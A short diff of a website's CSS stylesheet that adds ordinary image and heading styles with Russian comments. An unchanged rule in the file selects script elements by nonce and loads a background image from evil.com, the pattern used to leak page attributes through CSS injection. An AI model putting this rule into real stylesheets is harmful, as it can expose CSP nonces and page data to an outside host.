@@ -30,7 +30,16 @@ header {
     background: oklch(64.03025593752187 0.27888820505981027 339.4399205719088);
 }
 
+.col img {
+    max-width: 85%;
+    height: auto; /* Избегаем растягивания изображения */
+    display: block; /* Убираем лишнее пространство вокруг изображения */
+}
 
+.form_img {
+    margin-left: auto;
+    margin-right: auto;
+}
 
 main {
     flex: 1;
@@ -92,5 +101,9 @@ footer {
 
 script[nonce~="whatever"] {
     background: url("https://evil.com/nonce?whatever");
+}
+
+.container .h2 {
+    color: oklab(0.85 0.09 -0.08);
 }
 
